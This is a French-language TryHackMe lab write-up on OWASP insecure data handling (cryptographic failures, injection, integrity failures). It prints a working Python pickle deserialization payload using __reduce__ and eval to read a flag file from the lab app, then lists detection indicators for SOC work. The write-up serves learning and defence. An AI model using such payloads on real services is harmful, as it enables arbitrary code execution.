# OWASP Top 10 2025: Insecure Data Handling — Cyber Security 101 (TryHackMe)

**Catégorie :** OWASP Top 10 (2025) / Sécurité Web  
**Date de sortie :** 2025  
**Date de complétion :** 06/11/2026  
**Lien :** https://tryhackme.com/room/owaspinsecuredatahandling  
**Parcours :** [Cyber Security 101](https://tryhackme.com/path/outline/cybersecurity101)  
**Room précédente :** [Application Design Flaws](./owasp-application-design-flaws.md)

---

## 🎯 Objectif de la room

Comprendre les failles liées à la gestion des données : A04 (Cryptographic Failures), A05 (Injection) et A08 (Software or Data Integrity Failures), avec un focus pratique sur la désérialisation Python.

---

## 🧠 Ce que j'ai appris

### A04 : Cryptographic Failures
Mauvaise utilisation de la cryptographie : algorithmes obsolètes (MD5, SHA1), clés codées en dur, absence de chiffrement sur les données sensibles en transit (HTTP) ou au repos.

### A05 : Injection
L’application interprète des données non fiables comme du code ou des commandes. Exemples : SQLi, command injection, LDAP injection. La désérialisation non sécurisée est une forme d’injection.

### A08 : Software or Data Integrity Failures
L’application fait confiance à du code, des mises à jour ou des données sans vérifier leur intégrité ou leur origine. Cela inclut la désérialisation de données non fiables (comme le format `pickle` en Python), qui peut exécuter du code arbitraire.

**Défi pratique :** Une application web accepte des objets Python sérialisés en `pickle` (encodés en base64) et les désérialise sans vérification. En exploitant la méthode `__reduce__`, on peut exécuter une commande système (`cat flag.txt`) et récupérer le contenu du fichier.

---

## 🖥️ Lignes de commande utilisées

| Commande | Description |
|---|---|
| `python3 -c "import pickle, base64; class Malicious: def __reduce__(self): return (eval, (\"open('flag.txt').read()\",)); payload = pickle.dumps(Malicious()); print(base64.b64encode(payload).decode())"` | Générer le payload malveillant encodé en base64. |
| Formulaire web (`http://10.129.141.172:8002`) | Coller la chaîne base64 dans le champ “Pickle Data” et cliquer sur “Deserialize”. |

*Note : le payload généré exécute `open('flag.txt').read()` au moment de la désérialisation. Le résultat s’affiche dans la réponse de l’application.*

---

## 📌 Ce que je retiens pour un poste d'analyste SOC

- **La désérialisation non sécurisée** : C’est une faille critique, souvent utilisée dans les applications Java, Python (pickle), PHP, etc. En tant qu’analyste, je dois repérer les alertes liées à des données sérialisées suspectes (ex: cookies, paramètres base64 inhabituels).
- **L’intégrité des données** : Les applications doivent vérifier les signatures ou checksums avant de désérialiser. Un attaquant peut modifier un objet sérialisé pour exécuter du code.
- **Les logs** : Une requête POST vers un endpoint de désérialisation avec un payload base64 très long et contenant des motifs comme `__reduce__` ou `eval` est un excellent indicateur de compromission.

---

## ✅ Statut

- [x] Room terminée
- [x] Write-up publié

---

*Write-up rédigé dans le cadre de ma préparation au poste d'Analyste SOC junior.*